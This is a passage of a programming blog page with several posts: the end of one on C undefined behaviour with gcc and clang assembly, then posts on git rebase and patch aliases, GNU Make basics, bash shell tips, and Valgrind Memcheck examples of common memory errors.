<p>Let’s go on. In the above snippet we have used functions to increment and decrement the global value. Let us rewrite that code:</p>
<p>{% highlight cpp %} #include <stdio.h> #include <stdlib.h></p>
<p>int main() { int x = 0; x++; x++; printf(“%d%d”, –x, –x); return 0; } {% endhighlight %}</p>
<p>Here, we have another suprise:</p>
<pre><code>$ ./3-gcc 
00
$ ./3-clang 
10</code></pre>
<p>The <code>gcc</code> version printed only the final value of <code>x</code>, twice. Clearly, there is something happening here. Let’s look closer.</p>
<p>Looking at the generated assembly, we see that <code>gcc</code> generated this code:</p>
<pre><code>movl    $0, -4(%rbp)
addl    $1, -4(%rbp)
addl    $1, -4(%rbp)
subl    $1, -4(%rbp)
subl    $1, -4(%rbp)
movl    $.LC0, %eax
movl    -4(%rbp), %edx
movl    -4(%rbp), %ecx
movl    %ecx, %esi
movq    %rax, %rdi
movl    $0, %eax
call    printf</code></pre>
<p>On the other hand, <code>clang</code> generated:</p>
<pre><code>movl    -8(%rbp), %eax
addl    $1, %eax
movl    %eax, -8(%rbp)
movl    -8(%rbp), %eax
addl    $1, %eax
movl    %eax, -8(%rbp)
movl    -8(%rbp), %eax
addl    $4294967295, %eax       # imm = 0xFFFFFFFF
movl    %eax, -8(%rbp)
movl    -8(%rbp), %ecx
addl    $4294967295, %ecx       # imm = 0xFFFFFFFF
movl    %ecx, -8(%rbp)
movl    %eax, %esi
movl    %ecx, %edx
movb    $0, %al
callq   printf</code></pre>
<p>One can easily see that <code>gcc</code> did the operations on <code>x</code> before starting the function call sequence while <code>clang</code> interleaved stack operations with operations on <code>x</code> such that the output is the one we would expect. Not to mention the fact that substraction was replaced by addition.</p>
<p>However, what allows the compilers to do this? Luckily, we have compiled with warnings on:</p>
<pre><code>$ clang -Wall -Wextra 3.c -g -o 3-clang
$ gcc -Wall -Wextra 3.c -g -o 3-gcc
3.c: In function ‘main’:
3.c:9:24: warning: operation on ‘x’ may be undefined [-Wsequence-point]</code></pre>
<p>Reading the standard for sequence points we get:</p>
<blockquote>
<p>Evaluation of an expression may produce side effects. At certain specified points in the execution sequence called sequence points, all side effects of previous evaluations shall be complete and no side effects of subsequent evaluations shall have taken place.</p>
</blockquote>
<p>Reading further, we see that it is an <strong>undefined behaviour</strong> if:</p>
<blockquote>
<p>Between two sequence points, an object is modified more than once, or is modified and the prior value is read other than to determine the value to be stored.</p>
</blockquote>
<p>Lastly, the standard defines a sequence point to be (among other more complex constructs):</p>
<ul>
<li>a call of a function</li>
<li>end of the first operand or <code>&amp;&amp;</code>, <code>||</code>, <code>?</code> and <code>,</code></li>
</ul>
<p>Thus, our side effects in the <code>printf</code> function cause undefined behaviour and unspecified behaviour. Depending on the compiler, the results can be very different. This harms portability and should be avoided.</p>
<p>Before finishing the article, let’s see another example, using different constructs:</p>
<p>{% highlight cpp %} #include <stdio.h> #include <stdlib.h> #include <limits.h></p>
<p>int main() { int x = INT_MAX; void *p = &amp;x;</p>
<pre><code>printf(&quot;%d %d\n&quot;, x, x + 1);
printf(&quot;%p %p\n&quot;, p, p + 1);

return 0;</code></pre>
<p>} {% endhighlight %}</p>
<p>The possible outputs of this code and the reasoning behind are left as an exercise. Use the comments area to provide solutions for all exercises left in this article.</p>
<p>As a rule of thumb, try to limit the use of side effects inside a function call. You don’t know when you’ll fall into this trap again.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./git-useful-aliases.html" title="Git - Useful Aliases">Git - Useful Aliases</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on June 23, 2012</span>
            by
            <span class="author">Mihai Maruseac</span>
            </span>

            <p>This is the third article about <a href="http://git-scm.com/" title="Git">git</a> on this blog. It is highly recommended to read the other two as well: there is <a href="http://techblog.rosedu.org/git-good-practices.html" title="Git good practices">one</a> about some good practices in using <a href="http://git-scm.com/" title="Git">git</a> and <a href="http://techblog.rosedu.org/git-speeding-workflow.html" title="Git speeding workflow">another one</a> about some aliases which will speed up your interaction with the commit history.</p>
<p>The series of articles about <a href="http://git-scm.com/" title="Git">git</a> continues with a short presentation about two other aliases and the reason why they should be used in order to create better commits.</p>
<h3 id="rebase-instead-of-merge">Rebase instead of merge</h3>
<p>From time to time we rush to push our changes to the remote repository without thinking of the possibility that another developer had made some commits in the meantime. Luckily, we are announced when this happens:</p>
<pre><code>mihai@keldon:/data/ROSEdu/techblog$ git push
To gitolite@git.rosedu.org:techblog.git
 ! [rejected]        contrib -&gt; contrib (non-fast-forward)
error: failed to push some refs to 'gitolite@git.rosedu.org:techblog.git'
hint: Updates were rejected because the tip of your current branch is behind
hint: its remote counterpart. Merge the remote changes (e.g. 'git pull')
hint: before pushing again.
hint: See the 'Note about fast-forwards' in 'git push --help' for details.</code></pre>
<p>What is a fast-forward update? What we tried to do in the above command was just to update one reference in the upstream repository: we wanted to change the <code>HEAD</code> reference which pointed to a commit – let’s call it <code>A</code> – to another commit, the latest one in our repository – let’s call it <code>B</code>.</p>
<p>If and only if <code>B</code> is a descendant of <code>A</code> we have a fast-forward update. Otherwise, the update is non-fast-forward. These definitions generalize to local branches or any other kind of reference updates.</p>
<p>What is the purpose of this distinction? Any fast-forward updated guarantees that the history of <em>both</em> branches is not lost. In contrast, a non-fast-forward update will certainly lose a part of the history.</p>
<p>We need to change our point of view to see this. Let us view the two repositories in a simple diagram showing both branches from the very moment when the local repository was cloned:</p>
<div class="figure">
<img src="./images/gua-1.png" alt="initial-repo" /><p class="caption">initial-repo</p>
</div>
<p>The <code>HEAD</code> reference for the remote repository was pointing at commit <code>A</code> and we want to make it to point at commit <code>B</code> which is not a direct descendent of <code>A</code>, thus the update is non-fast-forward.</p>
<p>If <code>git push</code> was allowed to finish successfully in any of the two cases then the history from <code>O</code> up to <code>A</code> would be lost: developers would only see the history from <code>O</code> to <code>B</code> and would work only on top of the <code>B</code> commit. This is why <code>git push</code> failed.</p>
<p>The error message suggests to do a <code>git pull</code> in order to merge the two branches. Let’s see what will happen when we do this:</p>
<div class="figure">
<img src="./images/gua-2.png" alt="merge commit" /><p class="caption">merge commit</p>
</div>
<p>A merge commit <code>C</code> was created containing changes from both <code>A</code> and <code>B</code>. This is a <em>new</em> commit and it looks like the following one:</p>
<pre><code>mihai@keldon:$ git show 2603167
commit 2603167229a11b8dad6715246041ad29f792308c
Merge: ad4d7a1 6091ae3
Author: Alex Juncu &lt;ajuncu@ixiacom.com&gt;
Date:   Wed Nov 30 15:32:05 2011 +0200

    Merge branch 'contrib' of git.rosedu.org:techblog into contrib</code></pre>
<p>There are cases where this merge commit is needed. However, not all instances of the above diagram need a merge commit.</p>
<p>The other alternative is to do a rebase first using <code>git pull --rebase</code> for example. In this case, the following thing will happen: a new commit <code>D</code> will be created containing the set of changes needed to be applied on top of <code>A</code> in order to reach <code>B</code>.</p>
<div class="figure">
<img src="./images/gua-3.png" alt="rebase commit" /><p class="caption">rebase commit</p>
</div>
<p>Now, the <code>D</code> commit is already on top of <code>A</code> and the push will be a fast-forward update. This can be seen from the following screen as well:</p>
<pre><code>mihai@keldon:$ git pull --rebase
remote: Counting objects: 5, done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 3 (delta 2), reused 0 (delta 0)
Unpacking objects: 100% (3/3), done.
From git.rosedu.org:techblog
   b557977..38da5d0  contrib    -&gt; origin/contrib
First, rewinding head to replay your work on top of it...
Applying: Add author for first article.</code></pre>
<p>The push will simply update the <code>HEAD</code> reference to point to the <code>D</code> commit.</p>
<div class="figure">
<img src="./images/gua-4.png" alt="update HEAD after rebase commit" /><p class="caption">update HEAD after rebase commit</p>
</div>
<p>If the rebase cannot be done because of a merge conflict we are announced of this and the rebase will stop until we resolve it.</p>
<p>There are several ways to make <a href="http://git-scm.com/" title="Git">git</a> try to always use <code>--rebase</code> when pulling. What I recommend is to create an alias. I have this in <code>~/.gitconfig</code>:</p>
<pre><code>[alias]
        gpr = pull --rebase</code></pre>
<p>This has two benefits: I always try to do a rebase first and I type less. In fact, using TAB completion I have to press only 5 keys for this.</p>
<h3 id="interactive-addition-of-changes">Interactive addition of changes</h3>
<p>One rule for better <a href="http://git-scm.com/" title="Git">git</a> commits is to have short and meaningful commits with relevant commit messages. However, it is possible that we have done several unrelated changes to a single file (for example we have updated a comment and added some new code). Issuing a simple <code>git add file</code> will break the above rule.</p>
<p>One solution for this is to use <code>git add --interactive</code>. It is better to use <code>git add --patch</code> though.</p>
<p>Our change will be split in several hunks and each of them will be offered to us with a simple question at the end:</p>
<pre><code>@@ -76,6 +78,10 @@ TODO
     Did you mean this?
             gpr

+TODO: git gdc
+
+TODO: final thoughts
+
 [git]: http://git-scm.com/ &quot;Git&quot;
 [ggp]: http://techblog.rosedu.org/git-good-practices.html &quot;Git good practices&quot;
 [gsw]: http://techblog.rosedu.org/git-speeding-workflow.html &quot;Git speeding workflow&quot;
Stage this hunk [y,n,q,a,d,/,K,g,e,?]? y</code></pre>
<p>We can decide to accept or reject the hunk for this commit or we can split it in several other hunks. We can even edit the hunk if we need this.</p>
<p>In order to speed up typing I have an alias for this as well:</p>
<pre><code>gap = add --patch</code></pre>
<p>I have imprinted in my muscle memory to never type <code>git add</code> but <code>git gap</code>.</p>
<h3 id="conclusions">Conclusions</h3>
<p>The two aliases presented above help us be a little more proficient with <a href="http://git-scm.com/" title="Git">git</a> usage. I am using them for several months now and the results are good.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./gnu-make.html" title="GNU Make">GNU Make</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on May  8, 2012</span>
            by
            <span class="author">Mihai Tiriplica</span>
            </span>

            <p>In working with large projects it is necessary to compile from multiple sources. Since this is quite difficult, different tools have been developed to make this task easier. One such tool is GNU Make and the associated executable is <code>make</code>. Make solves compilation from multiple sources problem using the dependency relationships between them, described in a special file usually called <code>Makefile</code>.</p>
<h3 id="syntax">Syntax</h3>
<p>The file which describes the dependency relationships between project’s sources. It should be named <code>Makefile</code> or <code>makefile</code> and has the following syntax:</p>
<pre><code>target: dependency_list
&lt;tab&gt;command</code></pre>
<p>Usually, the target’s name matches the name of the resulted file, except only those which are <code>.PHONY</code> targets, called virtual targets (they do not generate a specific file). List dependencies include dependencies that are required for target execution. Usually, there are files from which the target will be built. A common mistake is that spaces are used instead of <code>TAB</code>. This will result in an error message when running make. An example Makefile is:</p>
<pre><code>exec:
	gcc foo.c bar.c main.c -o exec</code></pre>
<p>This is not the best way we can use make because it doesn’t describe any dependencies, so every time we run make it will run <code>gcc foo.c bar.c main.c -o exec</code>, even if there are no modified sources. Better use is the following example:</p>
<pre><code>exec: foo.c bar.c main.c
	gcc foo.c bar.c main.c -o exec</code></pre>
<p>In this case the target <code>exec</code> will run only if a source has changed. Neither this case takes full advantage of the facilities make offers, because modifying a single source leads to compiling all the existing sources. An ideal Makefile describes the lowest level possible dependencies. In our case it is the object file:</p>
<pre><code>exec: foo.o bar.o main.o
	gcc foo.o bar.o main.o -o exec
foo.o: foo.c
	gcc -c foo.c -o foo.o
bar.o: bar.c
	gcc -c bar.c -o bar.o
main.o: main.c
	gcc -c main.c -o main.o</code></pre>
<h3 id="how-it-works">How it works</h3>
<p>A particular target is executed by running <code>make target</code>. If there is no argument, it will execute the first target described. To execute a target all of his dependencies must be satisfied. For our example, <code>exec</code> target is executed only after <code>foo.o</code>, <code>bar.o</code>, <code>main.o</code>, which are conditioned by <code>foo.c</code>, <code>bar.c</code>, <code>main.c</code>, are obtained.</p>
<h3 id="variables">Variables</h3>
<p>In Makefile files we can declare variables to replace commonly used sequences or which are changed frequently. The variables’ values are obtained using the character <code>$</code>: <code>$(variable_name)</code>. For the example above, let’s suppose that one of the source files uses functions from <code>math.h</code>. We will declare a variable that is meant to specify that for linking:</p>
<pre><code>LDFLAGS=-lm
exec: foo.o bar.o main.o
	gcc $(LDFLAGS) foo.o bar.o main.o -o exec
foo.o: foo.c
	gcc -c foo.c -o foo.o
bar.o: bar.c
	gcc -c bar.c -o bar.o
main.o: main.c
	gcc -c main.c -o main.o</code></pre>
<p>Make offers several predefined variables, of which the most important are: * <code>$@</code> - target’s name * <code>$^</code> - dependecies list * <code>$&lt;</code> - the first dependencie</p>
<p>The Makefile above can be written in a more simple way:</p>
<pre><code>CC=gcc
LDFLAGS=-lm
exec: ana.o are.o mere.o
	$(CC) $(LDFLAGS) $^ -o $@
%.o: %.c
	$(CC) -c $&lt; -o $@</code></pre>
<p>Variables in a Makefile can also come from the environment where <code>make</code> is running. While running, make sees each environment variable as a local variable with the same name and the same value. Thus, assigning a value for <code>LDFLAGS</code> variable in the example above can cause changes to any compile command. To convert a local variable in an environment variable in order to use it in other Makefile files we use the <code>export</code> directive:</p>
<pre><code>export variable</code></pre>
<p>Inverse transformation is done using <code>unexport</code>:</p>
<pre><code>unexport variable</code></pre>
<h3 id="phony-target">.PHONY target</h3>
<p>If we want a target to be marked permanently as out of date we will use the <code>.PHONY</code> target. Let’s consider that there is a pack target that creates an archive which contains the project’s sources. If there is one source named <code>pack</code> and it does not change, the command associated with this target will not be executed. For this we use <code>.PHONY</code>. Also, by convention all Makefile files contain a <code>.PHONY</code> target called <code>clean</code> used to delete the files obtained from compiling or running the program.</p>
<pre><code>.PHONY: pack
pack:
	zip -r project.zip *
clean:
	rm *.o *.zip exec</code></pre>
<h3 id="implicit-rules">Implicit Rules</h3>
<p>Make allows us to use a simplified syntax. For example we don’t always have to write a command for some targets. This is called an implicit rule:</p>
<pre><code>ana.o: ana.c</code></pre>
<p>Another implicit rule is that when running the command <code>make source.c</code>, the file source.c will be compiled even if there is no Makefile. Implicit rules use the environment variables. Thus, the example considered by us is equivalent to:</p>
<pre><code>ana.o: ana.c
	$(CC) -c $(LDFLAGS) ana.c -o ana.o</code></pre>
<p>Because implicit rules use environment variables, it is easy to modify their behavior by a simple change of the variables’ values.</p>
<h3 id="final-touches">Final touches</h3>
<p>In many cases, the first target in a Makefile is a target that compiles all of the sources. It is very useful because we don’t have to specify a target every time we are running make.</p>
<p>Adding these changes to our example we get a complete Makefile:</p>
<pre><code>CC=gcc
LDFLAGS=-lm

all: exec

exec: ana.o are.o mere.o
	$(CC) $(LDFLAGS) $^ -o $@

foo.o: foo.c
	gcc -c foo.c -o foo.o
bar.o: bar.c
	gcc -c bar.c -o bar.o
main.o: main.c
	gcc -c main.c -o main.o

.PHONY: clean
	rm -rf *.o exec</code></pre>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./making-your-shell-life-easier.html" title="Making your shell life easier">Making your shell life easier</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on April 30, 2012</span>
            by
            <span class="author">Alexandru Juncu</span>
            </span>

            <p>Most Linux users prefer to use the CLI because of its efficiency. But the days of the single terminal in which you had your shell are long gone. Users take advantage of the GUI and use graphical terminals like <a href="http://library.gnome.org/users/gnome-terminal/stable/gnome-terminal-get-started.html.en"><code>gnome-terminal</code></a>, <a href="http://konsole.kde.org/"><code>konsole</code></a> or similar utilities, to start several shell instances. For example if you are a programmer, you might want to have one instance for the editor (with the code you are working on), another one to test and debug the compiled executable and – maybe – another for the documentation (<code>man</code> pages). If you are a system administrator you might have a shell with the configuration file of a service, one you use to test the running service, and maybe one shell connected to another server. But having a lot of windows (or tabs) can get confusing.</p>
<p>Some prefer to optimize their environment and use a CLI-oriented Window Manager, like <a href="http://xmonad.org/"><code>xmonad</code></a>, to <em>productively manage windows without the use of the mouse</em>. But what if you can only get access to a single terminal, like in the case of a SSH client to a remote host? What if you don’t have a GUI, when configuring a server on-site? Or what if you just like to have one terminal window opened? What you can do is install terminal multiplexing programs like <a href="http://www.gnu.org/software/screen/"><code>screen</code></a> or <a href="http://tmux.sourceforge.net/"><code>tmux</code></a>. These programs fork several shell instances behind your primary shell instance and you can switch between them using keyboard shortcuts. Or you can learn to make use of things your shell (<a href="http://www.gnu.org/software/bash/"><code>bash</code></a>, for example) already offers you.</p>
<h3 id="lesson-1-dont-close-things-that-you-will-open-again-soon.">Lesson 1: Don’t close things that you will open again soon.</h3>
<p>If you are using your editor to write code or to change a configuration file and you want to compile the code or restart a service and test the result, you can send your editor into background with the <code>CTRL-Z</code> keyboard shortcut, that sends a <code>SIGTSTOP</code> signal to the process. You can run other command and then return to your edited file with the <code>fg</code> command. You may have several tasks in background for that shell instance. You can use the <code>jobs</code> command to see them and their jobid, and you can send a specific job in foreground with <code>fg $JOBID</code>.</p>
<p>Some processes can not be sent into background with the <code>CTRL-Z</code> shortcut. For example, if you have a <code>ssh</code> connection to a remote server where the <code>CTRL-Z</code> will run not on the local host but on the remote host. In this case you will need to use the escape sequence of <code>[ENTER]~</code> and then send the <code>CTRL-Z</code> signal (you you need to press Enter, then the <code>~</code> key, then the <code>CTRL</code> and <code>Z</code> keys together).</p>
<p>Always try to take advantage of the current process’ features. For example you can run <code>make</code> from a <code>vim</code> (or actually run any commands by prefixing them with a <code>!</code>) and you can <code>kill</code> a process from inside a <code>top</code> or <code>htop</code> process.</p>
<h3 id="lesson-2-save-paths-for-directories-you-need.">Lesson 2: Save paths for directories you need.</h3>
<p>Unlike a GUI, in a CLI you can go directly to a specific directory from the current one by <code>cd</code>-ing to an absolute or relative path (not going one directory at a time like in the GUI). But you shouldn’t always have to type the path. If you are going back and forth between two directories, use the <code>cd -</code> command to change directory to the last working directory you were in.</p>
<p>If you have several directories you are going to go through, but you know you will return to a specific one, you can use the directory stack to save that directory. You can <code>pushd $DIR</code> a directory into the stack and then <code>popd</code> to change into the top-of-stack directory.</p>
<p>Also, you can always use the reverse history (<code>CTRL-R</code>) to reuse commands already given.</p>
<pre><code>rosedu:~# cd /etc/apache2/sites-available/
rosedu:/etc/apache2/sites-available# cd /var/www/
rosedu:/var/www# cd -
/etc/apache2/sites-available
rosedu:/etc/apache2/sites-available# pushd
/etc/apache2/sites-available /etc/apache2/sites-available
rosedu:/etc/apache2/sites-available# cd /home
rosedu:/home# cd /etc/
rosedu:/etc# popd
/etc/apache2/sites-available
rosedu:/etc/apache2/sites-available#</code></pre>
<h3 id="lesson-3-always-know-who-and-where-you-are.">Lesson 3: Always know who and where you are.</h3>
<p>Some people open different terminals to keep track of what they are doing or where they are (and not change the location inside that terminal). The shell is made for having its current directory changes and it helps you know where you are with the <code>prompt</code>. A normal prompts looks like <code>user@host:current_path$</code>. It’s important to know with what user and on what machine you are logged in. The <code>$</code> and <code>#</code> characters will show you what privileges you have (either limited or administrator). The <code>current\_path</code> is usually the name of the current directory (but it can sometimes be a full path). If that doesn’t provide you enough information, use the <code>pwd</code> command to print the working directory or setup the <code>PS1</code> variabile to include more information.</p>
<p>Shells like <a href="http://www.gnu.org/software/bash/"><code>bash</code></a> have lots of not so well known tricks. But if you learn those tricks, they will make your life easier.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./valgrind-introduction.html" title="Valgrind introduction">Valgrind introduction</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on April 29, 2012</span>
            by
            <span class="author">Mihai</span>
            </span>

            <p>A good programmer has a variety of tools to help him in developing good applications. We talked about <a href="http://sources.redhat.com/gdb/">gdb</a> in an <a href="http://techblog.rosedu.org/gdb-a-basic-workflow.html">article</a> at the beginning of April. Now, it is time for a crash introduction to <a href="http://valgrind.org/">Valgrind</a>.</p>
<p>This program is a collection of different tools. For example, it offers a <a href="http://valgrind.org/docs/manual/ms-manual.html">heap profiler</a>, a <a href="http://valgrind.org/docs/manual/hg-manual.html">thread error detector</a> or a <a href="http://valgrind.org/docs/manual/cg-manual.html">cache profiler</a>. However, the tool which gave <a href="http://valgrind.org/">Valgrind</a>’s fame is <a href="http://valgrind.org/docs/manual/mc-manual.html">Memcheck</a>, a memory error detector. Because of its popularity, this tool is the default one (to use other <a href="http://valgrind.org/">Valgrind</a> tools you have to use the <code>--tool=option</code> command line argument). In this article, we will concentrate on <a href="http://valgrind.org/docs/manual/mc-manual.html">Memcheck</a> only.</p>
<h3 id="detecting-memory-leaks">Detecting memory leaks</h3>
<p>Mainly, one would use <a href="http://valgrind.org/">Valgrind</a> to detect memory leaks in his application. By this, we mean memory which was allocated but wasn’t released back. For example, take this program:</p>
<p>{% highlight cpp %} void f() { int *a = calloc(1024, sizeof(a[0])); }</p>
<p>int main() { int i;</p>
<pre><code>for (i = 0; i &lt; 1024; i++)
    f();

return 0;</code></pre>
<p>} {% endhighlight %}</p>
<p>This program allocates <code>sizeof(int)</code> MB of memory and doesn’t free them. Of course, at the end of the execution, the operating systems takes care of releasing this memory. However, suppose that the <code>f</code> function was instead called from a server executable which shouldn’t be stopped. In this case, each invocation of <code>f</code> will eat away <code>sizeof(int)</code> KB memory (depending on architecture, 4KB or 8KB).</p>
<p>The example is simple, the problem could be observed with naked eyes. However, let’s see what <a href="http://valgrind.org/">Valgrind</a> tells us:</p>
<pre><code>==11418== Memcheck, a memory error detector
==11418== Copyright (C) 2002-2011, and GNU GPL'd, by Julian Seward et al.
==11418== Using Valgrind-3.7.0 and LibVEX; rerun with -h for copyright info
==11418== Command: ./a.out
==11418==
==11418==
==11418== HEAP SUMMARY:
==11418==     in use at exit: 4,194,304 bytes in 1,024 blocks
==11418==   total heap usage: 1,024 allocs, 0 frees, 4,194,304 bytes allocated
==11418==
==11418== LEAK SUMMARY:
==11418==    definitely lost: 4,194,304 bytes in 1,024 blocks
==11418==    indirectly lost: 0 bytes in 0 blocks
==11418==      possibly lost: 0 bytes in 0 blocks
==11418==    still reachable: 0 bytes in 0 blocks
==11418==         suppressed: 0 bytes in 0 blocks
==11418== Rerun with --leak-check=full to see details of leaked memory
==11418==
==11418== For counts of detected and suppressed errors, rerun with: -v
==11418== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 3 from 3)</code></pre>
<p>The number that gets repeated on each line of the output is the PID of our executable. At the end of the run, we are offered a heap summary (from where we can see that our program allocated 4MB of memory) and a leak summary.</p>
<p>Let’s see what happens after we take into account the suggestion to run with <code>--leak-check=full</code>. First, we compile the program adding debugging information, using the <code>-g</code> <a href="http://gcc.gnu.org/">GCC</a> flag. And, then, we run the executable under <a href="http://valgrind.org/">Valgrind</a>:</p>
<pre><code>mihai@keldon:/tmp/mm/valgrind$ valgrind --leak-check=full ./a.out
==11527== Memcheck, a memory error detector
==11527== Copyright (C) 2002-2011, and GNU GPL'd, by Julian Seward et al.
==11527== Using Valgrind-3.7.0 and LibVEX; rerun with -h for copyright info
==11527== Command: ./a.out
==11527==
==11527==
==11527== HEAP SUMMARY:
==11527==     in use at exit: 4,194,304 bytes in 1,024 blocks
==11527==   total heap usage: 1,024 allocs, 0 frees, 4,194,304 bytes allocated
==11527==
==11527== 4,194,304 bytes in 1,024 blocks are definitely lost in loss record 1 of 1
==11527==    at 0x4C29024: calloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==11527==    by 0x4004F2: f (1.c:6)
==11527==    by 0x400513: main (1.c:14)
==11527==
==11527== LEAK SUMMARY:
==11527==    definitely lost: 4,194,304 bytes in 1,024 blocks
==11527==    indirectly lost: 0 bytes in 0 blocks
==11527==      possibly lost: 0 bytes in 0 blocks
==11527==    still reachable: 0 bytes in 0 blocks
==11527==         suppressed: 0 bytes in 0 blocks
==11527==
==11527== For counts of detected and suppressed errors, rerun with: -v
==11527== ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 3 from 3)</code></pre>
<p>This time, we see that the memory was allocated in line 6 in function <code>f</code>. This allows us to insert the needed <code>free</code> at the correct spot.</p>
<p><strong>Quick question</strong>: what would have happened if our program was compiled with optimizations on (try <code>-O3</code> for example)?</p>
<h3 id="wrong-cases-of-memory-release">Wrong cases of memory release</h3>
<p>What happens when we free the same memory address twice? Let’s use this program:</p>
<p>{% highlight cpp %} void <em>f() { int </em>a = calloc(16, sizeof(a[0])); free(a); return a; }</p>
<p>int main() { int *a = f(); free(a); return 0; } {% endhighlight %}</p>
<p>Running it with <a href="http://valgrind.org/">Valgrind</a> yields:</p>
<pre><code>mihai@keldon:/tmp/mm/valgrind$ valgrind ./a.out
==11734== Memcheck, a memory error detector
==11734== Copyright (C) 2002-2011, and GNU GPL'd, by Julian Seward et al.
==11734== Using Valgrind-3.7.0 and LibVEX; rerun with -h for copyright info
==11734== Command: ./a.out
==11734==
==11734== Invalid free() / delete / delete[] / realloc()
==11734==    at 0x4C29A9E: free (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==11734==    by 0x40057A: main (1.c:14)
==11734==  Address 0x51d2040 is 0 bytes inside a block of size 64 free'd
==11734==    at 0x4C29A9E: free (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==11734==    by 0x400552: f (1.c:7)
==11734==    by 0x40056A: main (1.c:13)
==11734==
==11734==
==11734== HEAP SUMMARY:
==11734==     in use at exit: 0 bytes in 0 blocks
==11734==   total heap usage: 1 allocs, 2 frees, 64 bytes allocated
==11734==
==11734== All heap blocks were freed -- no leaks are possible
==11734==
==11734== For counts of detected and suppressed errors, rerun with: -v
==11734== ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 3 from 3)</code></pre>
<p>We can see both locations where the memory was released.</p>
<p>Now, consider this C++ code, a tweaked version of the above:</p>
<p>{% highlight cpp %} int <em>f() { int </em>a = (int *)calloc(16, sizeof(a[0])); return a; }</p>
<p>int main() { int *a = f(); delete a; return 0; } {% endhighlight %}</p>
<p>Running under <a href="http://valgrind.org/">Valgrind</a>, we receive the following output (we will use <code>-q</code> to show only the errors reported by Valgrind – no header and no statistics at the end):</p>
<pre><code>mihai@keldon:/tmp/mm/valgrind$ valgrind -q ./a.out
==11757== Mismatched free() / delete / delete []
==11757==    at 0x4C2972C: operator delete(void*) (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==11757==    by 0x400659: main (1.c:13)
==11757==  Address 0x59e0040 is 0 bytes inside a block of size 64 alloc'd
==11757==    at 0x4C29024: calloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==11757==    by 0x400632: f() (1.c:6)
==11757==    by 0x400649: main (1.c:12)</code></pre>
<p>Before finishing this section, let’s consider the case of freeing from inside an allocated block. See this code:</p>
<p>{% highlight cpp %} void <em>f() { int </em>a = calloc(16, sizeof(a[0])); return a + 4; }</p>
<p>int main() { int *a = f(); free(a); return 0; } {% endhighlight %}</p>
<p><a href="http://valgrind.org/">Valgrind</a> gives the following output:</p>
<pre><code>mihai@keldon:/tmp/mm/valgrind$ valgrind -q ./a.out
==11765== Invalid free() / delete / delete[] / realloc()
==11765==    at 0x4C29A9E: free (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==11765==    by 0x400572: main (1.c:13)
==11765==  Address 0x51d2050 is 16 bytes inside a block of size 64 alloc'd
==11765==    at 0x4C29024: calloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==11765==    by 0x400542: f (1.c:6)
==11765==    by 0x400562: main (1.c:12)</code></pre>
<p>From this we can easily see that we tried to free from inside an allocated block instead of using the block’s address. Moreover, we find where the block was allocated and we can fix our program now.</p>
<h3 id="incorrect-usage-of-memory">Incorrect usage of memory</h3>
<p>Let’s see this simple code:</p>
<p>{% highlight cpp %} struct s { int a, b; };</p>
<p>int main() { struct s s; s.a = 42; if (s.b) printf(“s.b”); return 0; } {% endhighlight %}</p>
<p>We didn’t initialize <code>s.b</code>. <a href="http://valgrind.org/">Valgrind</a> reports this:</p>
<pre><code>mihai@keldon:/tmp/mm/valgrind$ valgrind -q ./a.out
==11868== Conditional jump or move depends on uninitialised value(s)
==11868==    at 0x4004F0: main (1.c:12)
==11868==</code></pre>
<p>This was simple. Now, consider this common case:</p>
<p>{% highlight cpp %} int main() { char <em>s = strdup(“Valgrind rocks”); char </em>q = malloc(strlen(s)); strcpy(q, s); return 0; } {% endhighlight %}</p>
<p>This code looks perfectly valid. Does it? <a href="http://valgrind.org/">Valgrind</a> says otherwise:</p>
<pre><code>mihai@keldon:/tmp/mm/valgrind$ valgrind -q ./a.out
==12038== Invalid write of size 1
==12038==    at 0x4C2B27F: strcpy (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==12038==    by 0x4005FC: main (1.c:9)
==12038==  Address 0x51d209e is 0 bytes after a block of size 14 alloc'd
==12038==    at 0x4C2A93D: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==12038==    by 0x4005E5: main (1.c:8)</code></pre>
